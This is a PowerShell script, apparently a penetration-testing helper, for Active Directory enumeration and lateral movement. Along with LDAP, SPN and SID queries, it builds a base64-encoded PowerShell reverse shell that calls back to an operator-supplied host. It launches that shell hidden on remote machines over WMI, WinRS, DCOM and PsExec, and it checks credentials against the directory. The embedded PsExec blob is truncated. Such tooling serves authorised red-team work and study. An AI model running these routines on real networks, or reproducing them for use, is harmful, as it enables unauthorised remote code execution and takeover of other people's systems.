<#
    AdEnumHelper.

    A small helper script to help in AD enumeration and lateral movement.
#>
#Parameters
param (
	[Parameter(Mandatory=$true)]
        [string]$param1,
	
	[Parameter(Mandatory=$false)]
	[string]$param2 = "l",

	[Parameter(Mandatory=$false)]
	[string]$param3,
	
	[Parameter(Mandatory=$false)]
	[string]$param4,
	
	[Parameter(Mandatory=$false)]
	[string]$param5,
	
	[Parameter(Mandatory=$false)]
	[string]$param6,
	
	[Parameter(Mandatory=$false)]
	[string]$param7)

#PsExec
$psexec_base = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAA'
$psexec64_b64 = $psexec_base + ''
$psexec_b64 = $psexec_base + ''

#Script help
if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
{
  Write-Host "
<------------------------------------------------------------------------------------------------------->
  
 Usage: .\enumhelper.ps1 '<param1>' '<param2>' '<param3>' '<param4>' '<param5>' '<param6>' '<param7>'
  
  The '<param1>' is mandatory, if not defined will be prompted, the rest are optional.
 
<------------------------------------------------------------------------------------------------------->
  
  Using the parameters: '<param1>' == LDAP query, for example:
  .\enumhelper.ps1 '(&(SamAccountType=805306368)(name=p00p))'
 
   
  Using the optional: '<param2>' == 'L' to list all properties for the LDAP-response object
                      '<param2>' == 'property' to print only the chosen property's value
 					  
  For example:
  .\enumhelper.ps1 '(&(SamAccountType=805306368)(name=p00p))' 'L'
  or
  .\enumhelper.ps1 '(&(SamAccountType=805306368)(name=p00p))' 'whencreated'
  
<------------------------------------------------------------------------------------------------------->
  
  For reminder, the SamAccountTypes to query for, you need to use the decimal notation:
  #SAM_DOMAIN_OBJECT 0x0 ------------------------> 0
  #SAM_GROUP_OBJECT 0x10000000 ------------------> 268435456
  #SAM_NON_SECURITY_GROUP_OBJECT 0x10000001 -----> 268435457
  #SAM_ALIAS_OBJECT 0x20000000 ------------------> 536870912
  #SAM_NON_SECURITY_ALIAS_OBJECT 0x20000001 -----> 536870913
  #SAM_USER_OBJECT 0x30000000 -------------------> 805306368
  #SAM_NORMAL_USER_ACCOUNT 0x30000000 -----------> 805306368
  #SAM_MACHINE_ACCOUNT 0x30000001 ---------------> 805306369
  #SAM_TRUST_ACCOUNT 0x30000002 -----------------> 805306370
  #SAM_APP_BASIC_GROUP 0x40000000 ---------------> 1073741824
  #SAM_APP_QUERY_GROUP 0x40000001 ---------------> 1073741825
  #SAM_ACCOUNT_TYPE_MAX 0x7fffffff --------------> 2147483647  
  
<------------------------------------------------------------------------------------------------------->
  
  Also some other stuff can be done with '<param1>':
  '<param1>' == 'spnlist'    -->  Prints out all SPNs and related objects
  '<param1>' == 'dcinfo'     -->  Prints out DC name, hostname, OS, OS version, IPv4 and IPv6
  '<param1>' == 'deviceinfo' -->  Prints out AD devices' info: Name, hostname, OS, OS SP, OS version, 
                                  IPv4 and IPv6
  
  For example:
  .\enumhelper.ps1 'spnlist'
  .\enumhelper.ps1 'dcinfo'
  .\enumhelper.ps1 'deviceinfo'
 
<------------------------------------------------------------------------------------------------------->
 
  Leveraging further with '<param2>':
  '<param1>' == 'spncheck' '<param2>' == 'account' -->  Check if any SPNs (services) are tied to a 
                                                        (service)account
  '<param1>' == 'checksid' '<param2>' == 'SID'     -->  Return the AD user / group info by SID, can be 
                                                        used to convert a SID to name for example
  '<param1>' == 'findsid'  '<param2>' == 'SID'     -->  Look through the whole AD for a SID match if you
                                                        don't know the object type (=user/group/etc)
  
  For example:
  .\enumhelper.ps1 'spncheck' 'sql_service'
  .\enumhelper.ps1 'checksid' 'S-1-5-21-809893099-1472282828-2400958209-1105'
  .\enumhelper.ps1 'findsid' 'S-1-5-21-809893099-1472282828-2400958209-1105'
 
<------------------------------------------------------------------------------------------------------->
 
  And then there's '<param3>' which can be used to do user/pass queries against the AD:
  '<param1>' == 'auth' '<param2>' == 'username'  '<param3>' == 'password'
  
  For example:
  .\enumhelper.ps1 'auth' 'megaAdmin' 'verySecurePassword'
 
  Or for lateral movement over DCOM (you need LA rights):
  '<param1>' == 'dcom' '<param2>' == target IP '<param3>' == remote command
  
  For example:
  .\enumhelper.ps1 'dcom' '192.168.12.34' 'cmd /c calc.exe'
 
<------------------------------------------------------------------------------------------------------->
 
  By expanding further using '<param4>', you can try to remote over PowerShell, where
  '<param1>' == 'psremote' '<param2>' == 'username' '<param3>' == 'password' '<param4>' == 'hostname'
  
  For example:
  .\enumhelper.ps1 'psremote' 'adminusername' 'adminpassword' 'dc1.testad.local'
 
  With adding '<param5>' we can try to run remote commands over WMI or WINRS:
  '<param1>' == 'wmi' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target IP
  '<param5>' == remote command to run
  or
  '<param1>' == 'winrs' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target hostname
  '<param5>' == remote command to run
  
  For example:
  .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'cmd'
  .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'cmd'
  !NOTE: you can just run with 'wmi' or 'winrs' and the rest will be prompted.
  
  You can also run reverse shell over DCOM:
  '<param1>* == 'dcom' '<param2>' == target IP '<param3>' == 'reverse-shell' '<param4>' == lhost IP 
  '<param5>' == lhost port
  
  For example:
  .\enumhelper.ps1 'dcom' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
 
  To further expand WMI / WINRS we can also launch a prebuilt reverse shell command, you just need to enter:
  '<param5>' == 'reverse-shell' '<param6>' == lhost IP '<param7>' == lhost port or use the same 
  param5 when prompted for a command:
  
  For example:
  .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
  .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'reverse-shell' '192.168.23.45' '4444'
  
<------------------------------------------------------------------------------------------------------->
 
  " -BackgroundColor Green -ForegroundColor Black
  exit
}
elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSREMOTE" -or 
$param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64' -or $param1.ToUpper() -eq "DCOM")
{
	if ($param2 -ne "1" -and $param2 -and $param3 -and $param1.ToUpper() -ne "DCOM")
	{
		$username = $param2
		$insecure_password = $param3
		if ($param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
		{
			$password = $insecure_password
		}
		else
		{
			$password = ConvertTo-SecureString $insecure_password -AsPlaintext -Force
		}
		$computer = $param4
		if ($param1.ToUpper() -ne "PSREMOTE")
		{
			$command = $param5
		}
		else
		{
			$command = "fake_command"	
		}
	}
	else
	{
		if ($param1.ToUpper() -eq "DCOM")
		{
			if (-not $param2 -or -not $param3)
			{
				$computer = Read-Host -prompt 'Target IP: '
				Write-Host "You can run reverse shell, by just typing 'reverse-shell' as the command." -ForegroundColor Yellow
				$command = Read-Host -prompt 'Command to run: '
			}
			else
			{
				$computer = $param2
				$command = $param3
			}
		}
		else
		{
			while (-not $username -or -not $password -or -not $computer -or -not $command)
			{
				$username = Read-Host -prompt 'Username: '
				if ($param1 -eq "WINRS")
				{
					$password = Read-Host -prompt 'Password: '
					$computer = Read-Host -prompt 'Target hostname: '
					$command = Read-Host -prompt 'Command to run: '
				}
				elseif ($param1.ToUpper() -eq "WMI")
				{
					$password = Read-Host -prompt 'Password: ' -AsSecureString
					$computer = Read-Host -prompt 'Target IP: '
					$command = Read-Host -prompt 'Command to run: '
				}
				elseif ($param1.ToUpper() -eq "PSREMOTE")
				{
					$password = Read-Host -prompt 'Password: ' -AsSecureString
					$computer = Read-Host -prompt 'Target hostname: '
					$command = "fake_command"
				}
				elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
				{
					$password = Read-Host -prompt 'Password: ' -AsSecureString
					$computer = Read-Host -prompt 'Target (domain/)hostname or (domain/)IP: '
					$command = Read-Host -prompt 'Command to run: '
				}
			}
		}
	}
	#Build the reverse shell command
	if ($command.ToUpper() -eq "REVERSE-SHELL")
	{
		if ($param6 -and $param7)
		{
			$lhost = $param6
			$lport = $param7
		}
		elseif ($param1.ToUpper() -eq "DCOM")
		{
			if ($param4 -and $param5)
			{
				$lhost = $param4
				$lport = $param5

			}
			else
			{
				$lhost = Read-Host -prompt 'LHost IP: '
				$lport = Read-Host -prompt 'LHost port: '
			}
			$param6 = "reverse"
		}
		else
		{
			$lhost = Read-Host -prompt 'LHost IP: '
			$lport = Read-Host -prompt 'LHost port: '
		}
		$rshell = '$client = New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
		$rshell_bytes = [System.Text.Encoding]::Unicode.GetBytes($rshell)
		$encoded_rshell =[Convert]::ToBase64String($rshell_bytes)
		#Because I was wasting too much time to figure out why calling powershell parameters over PsExec failed,
		#putting it under good old cmd
		if ($param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64')
		{
			$command = 'cmd /c powershell.exe -nop -w hidden -e ' + $encoded_rshell
		}
		else
		{
			$command = 'powershell -nop -w hidden -e ' + $encoded_rshell
		}
	}
	
	Write-Host ""
	if ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "PSREMOTE")
	{
		try
		{
			$credential = New-Object System.Management.Automation.PSCredential $username, $password
			#RUN OVER WMI
			if ($param1.ToUpper() -eq "WMI")
			{
				Write-Host "###--------------WMIC-RUN--------------------###" -ForegroundColor Yellow
				Write-Host ""
				$options = New-CimSessionOption -Protocol DCOM -ErrorAction stop
				$params = @{'ComputerName'=$computer
					'Credential'=$credential
					'SessionOption'=$options
					'ErrorAction'='Stop'}
				$session = New-CimSession @params
			}
			#RUN OVER POWERSHELL REMOTE
			elseif ($param1.ToUpper() -eq "PSREMOTE")
			{
				Write-Host "###--------------PSREMOTE--------------------###" -ForegroundColor Yellow
				Write-Host ""
				$output = & New-PSSession -ComputerName $computer -Credential $credential 2>&1
				if ($output -like '*domain*isn*t*available*')
				{
					Write-Host "Domain and host unreachable, is the DC down and hostname correct?!" -ForegroundColor Red
					Write-Host ""
					exit
				}
				elseif ($output -like '*IP*address*under*the*following*conditions*')
				{
					Write-Host "You need to use hostname instead of IP!" -ForegroundColor Red
					Write-Host ""
					exit
				}
				elseif ($output -like '*Cannot*find*the*computer*')
				{
					Write-Host "Hostname $computer not found!" -ForegroundColor Red
					Write-Host ""
					exit
				}
				elseif ($output -like '*The*user*name*or*password*is*incorrect*')
				{
					Write-Host ""
					Write-Host "Incorrect username/password!" -ForegroundColor Red
					exit
				}
				else
				{
					Write-Host $output
				}
				$this_session = (Get-PSSession).id.length-1
				Enter-PSSession (Get-PSSession).id[$this_session]
				Disconnect-PSSession (Get-PSSession).id[$this_session]
				exit
			}
		}
		catch [Microsoft.Management.Infrastructure.CimException]
		{
			if ($_.Exception.Message -like '*Access*Denied*')
			{
				Write-Host "Invalid credentials!" -ForegroundColor Red
			}
			elseif ($_.Exception.Message -like '*RPC*server*unavailable*')
			{
				Write-Host "The host is unreachable: $computer" -ForegroundColor Red
			}
			elseif ($_.Exception.Message -like '*your*domain*isn*t*available*')
			{
				Write-Host "Domain unreachable, is the DC down?!" -ForegroundColor Red
			}
			else
			{
				$_.Exception.Message
			}
			exit
		}
		
		try
		{
			Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create `
			-Arguments @{CommandLine=$Command}
		}
		catch [System.Management.Automation.ParameterBindingException]
		{
			Write-Host "Cim-Session failed!" -ForeGroundColor Red
		}
		catch
		{
			$_.Exception.Message
		}
	}
	#RUN OVER WINRS
	elseif ($param1.ToUpper() -eq "WINRS")
	{
		Write-Host "###--------------WINRS-RUN--------------------###" -ForegroundColor Yellow
		Write-Host ""
		$output = & winrs -r:$computer -u:$username -p:$password $command 2>&1
		if ($output -like '*IP*address*under*the*following*conditions*')
		{
			Write-Host "You need to use hostname instead of IP with WINRS!" -ForeGroundColor Red
		}
		elseif ($output -like '*Cannot*find*the*computer*')
		{
			Write-Host "The hostname was not found: $computer" -ForeGroundColor Red
		}
		else
		{
			$output > tempfile
		}
		Write-Host ""
		Write-Host "###--------------WINRS-DONE-------------------###" -ForegroundColor Yellow
	}
	#RUN OVER DCOM
	elseif ($param1.ToUpper() -eq "DCOM")
	{
		$com_instance = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$computer))
		if ($param6 -eq "reverse")
		{
			$params = $command
			$command = "powershell"
		}
		else
		{
			$params=($command -split " ",2)[1]
			$command=($command -split " ",2)[0]
		}
		$com_instance.Document.ActiveView.ExecuteShellCommand($command,$null,$params,"7")
	}
	#Get PsExec.exe, PsExec64.exe or run a command with either
	elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
	{
		#Get the psexec binary
		Write-Host "###-------------PSEXEC-WRITE------------------###" -ForegroundColor Yellow
		Write-Host ""
		if ($param1.ToUpper() -eq "PSEXEC")
		{
			if (-not (Test-Path "psexec.exe"))
			{
				Write-Host "Writing PsExec.exe to disk..." -ForegroundColor Green
				$filename = 'PsExec.exe'
				$binary = [Convert]::FromBase64String($psexec_b64)
				Set-Content -Path $filename -Value $binary -Encoding Byte
			}
			else
			{
				Write-Host "The current folder already contains PsExec.exe" -ForegroundColor Green
			}
		}
		else
		{
			if (-not (Test-Path "psexec64.exe"))
			{
				Write-Host "Writing PsExec64.exe to disk..." -ForegroundColor Green
				$filename = 'PsExec64.exe'
				$binary = [Convert]::FromBase64String($psexec64_b64)
				Set-Content -Path $filename -Value $binary -Encoding Byte
			}
			else
			{
				Write-Host "The current folder already contains PsExec64.exe" -ForegroundColor Green
			}
		}
		Write-Host ""
		Write-Host "###-----------PSEXEC-WRITE-DONE---------------###" -ForegroundColor Yellow
	
		#RUN OVER PSEXEC
		if ($username -ne "1")
		{
			$params=($command -split " ",2)[1]
			$command=($command -split " ",2)[0]
			if ($param1.ToUpper() -eq "PSEXEC")
			{
				try
				{
					.\PsExec.exe \\$computer -u $username -p $password -i $command $params
				}
				catch
				{
					Write-Host ""
					Write-Host "Your system doesn't support PsExec, try PsExec64" -ForegroundColor Red	
				}

			}
			else
			{
				try
				{
					.\PsExec64.exe \\$computer -u $username -p $password -i $command $params
				}
				catch
				{
					Write-Host ""
					Write-Host "Your system doesn't support PsExec64, try PsExec" -ForegroundColor Red
				}
			}
		}
	}
	exit
}
#Check the info for the DC
elseif ($param1.ToUpper() -eq "DCINFO")
{
	Get-ADDomainController -Filter * | Format-Table Name, Hostname, OperatingSystem, OperatingSystemVersion, IPv4Address, IPv6Address -Wrap -Auto
	exit
}
#Check the info for computers tied to the AD
elseif ($param1.ToUpper() -eq "DEVICEINFO")
{
	Get-ADComputer -Filter * -Property * `
	| Format-Table Name, DNSHostname, OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion, IPv4Address, IPv6Address -Wrap -Auto	
	exit
}
#Check SPN ties for account defined as the second parameter on commandline
elseif ($param1.ToUpper() -eq "CHECKSPN")
{
	if ($param2.ToUpper() -ne "L")
	{
		setspn -L $param2
	}
	else
	{
		Write-Host 'Check the service account name!' -ForegroundColor Red
	}
	exit
}
#Convert SID to user/group
elseif ($param1.ToUpper() -eq "CHECKSID" -or $param1.ToUpper() -eq "FINDSID")
{
	if ($param2.ToUpper() -ne "L")
	{
		if ($param1.ToUpper() -eq "FINDSID")
		{
			$result = Get-ADObject -IncludeDeletedObjects -Filter "objectSid -eq '$param2'"|select Name,ObjectClass
			if (-not $result)
			{
				Write-Host 'Nothing matching that SID in AD' -ForegroundColor Red
			}
			else
			{	
				$result	
			}
		}
		else
		{
			Write-Host ''
			Write-Host '----CHECKING FROM USERS----'  -ForegroundColor Yellow
			try{
				Get-ADUser -Identity $param2
			}
			catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException]
			{
				Write-Host 'The SID was not found from the AD users!' -ForegroundColor Red
			}
			Write-Host '' 
			Write-Host '----CHECKING FROM GROUPS----'  -ForegroundColor Yellow
			try{
				Get-ADGroup -Identity $param2
			}
			catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException]
			{
				Write-Host 'The SID was not found from AD members!' -ForegroundColor Red
			}
			Write-Host ''
		}
	}
	else
	{
		Write-Host 'Recheck the SID!' -ForegroundColor Red
	}
	exit
}

#LDAP-search  function
function ldap_search {	
    $pdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $dn = ([ADSI]'').distinguishedName
    $ldap_path = "LDAP://$pdc/$dn"
    if ($param1.ToUpper() -eq "AUTH")
	{
		$ldap_login_res = New-Object System.DirectoryServices.DirectoryEntry($ldap_path, $param2, $param3)
		if (-not $ldap_login_res.DistinguishedName)
		{
			return $false
		}
		else
		{
			return $true
		}
	}
	elseif ($param1.ToUpper() -eq "SPNLIST")
	{
		$spn_search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
		$spn_search.filter = "(servicePrincipalName=*)"
		$spn_search_res = $spn_search.Findall()
		return $spn_search_res
	}
	else
	{
		$dir_entry = New-Object System.DirectoryServices.DirectoryEntry($ldap_path)
		$dir_searcher = New-Object System.DirectoryServices.DirectorySearcher($dir_entry, $param1)	
		return $dir_searcher.FindAll()
	}
}

$param1_res = ldap_search

#Print the LDAP-query results based on the paramaters from commandline
Write-Host ""
Write-Host "###--------------RESULTS--------------------###" -ForegroundColor Yellow
Write-Host ""
#Full query
if ($param2 -eq "" -or $param1.ToUpper() -eq "AUTH")
{
	if ($param1_res)
	{
		Write-Host 'Credentials match ('$param2' / '$param3' )' -ForegroundColor Green
		Write-Host ""
	}
	elseif (-not $param1_res)
	{
		Write-Host 'Credentials do not match ('$param2' / '$param3' )' -ForegroundColor Red
		Write-Host ""
	}
	else
	{
		return $param1_res
	}
}
elseif ($param1.ToUpper() -eq "SPNLIST")
{
	foreach( $result in $param1_res )
	{
		$userEntry = $result.GetDirectoryEntry()
		Write-host "Object Name =  "	$userEntry.name -ForeGroundColor "black" -BackgroundColor "gray"
		Write-host "DN          =  "	$userEntry.distinguishedName -ForeGroundColor "black" -BackgroundColor "gray"
		Write-host "Object Cat. =  " $userEntry.objectCategory -ForeGroundColor "black" -BackgroundColor "gray"
		Write-host "servicePrincipalNames" -ForeGroundColor "black"
		$i=1
		foreach( $SPN in $userEntry.servicePrincipalName ) 
		{
			Write-host "SPN ${i} = $SPN" -ForeGroundColor "red" -BackgroundColor "gray"
			$i+=1
		}
		Write-host ""
	}
}
#List properties for the queried object
elseif ($param2.ToUpper() -eq "L")
{
	foreach ($query_object in $param1_res)
	{
		Write-Host ""
		$query_object.properties
		Write-Host ""
		Write-Host "###-----------------------------------------###"  -ForegroundColor Yellow
	}
}
#List the queried objects values for a specific item
else
{
	foreach ($query_object in $param1_res) 
	{
		Write-Host ""
		$query_object.properties.item($param2)
		Write-Host ""
		Write-Host "###-----------------------------------------###" -ForegroundColor Yellow
	}
}
